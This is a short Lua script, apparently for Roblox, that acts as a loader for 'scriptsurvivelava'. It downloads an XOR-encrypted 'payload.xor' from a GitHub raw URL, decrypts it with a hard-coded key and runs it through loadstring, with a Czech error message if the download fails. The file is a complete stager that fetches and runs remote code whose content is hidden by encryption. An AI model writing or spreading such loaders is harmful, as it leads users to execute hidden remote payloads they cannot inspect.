-- loader pro scriptsurvivelava (XOR decrypt + load)

local key = "aVysHSYBTqIuFaQW"

local function xor_decrypt(data, k)
    local res = {}
    for i = 1, #data do
        local kb = k:byte((i-1) % #k + 1)
        local cb = data:byte(i)
        res[i] = string.char(bit32.band(bit32.bxor(cb, kb), 0xFF))
    end
    return table.concat(res)
end

local url = "https://raw.githubusercontent.com/janhub1/scriptsurvivelava/main/payload.xor"

local HttpService = game:GetService("HttpService")
local ok, encrypted = pcall(HttpService.GetAsync, HttpService, url)

if not ok then
    warn("Nepodařilo se stáhnout payload: " .. tostring(encrypted))
    return
end

local code = xor_decrypt(encrypted, key)

loadstring(code)()
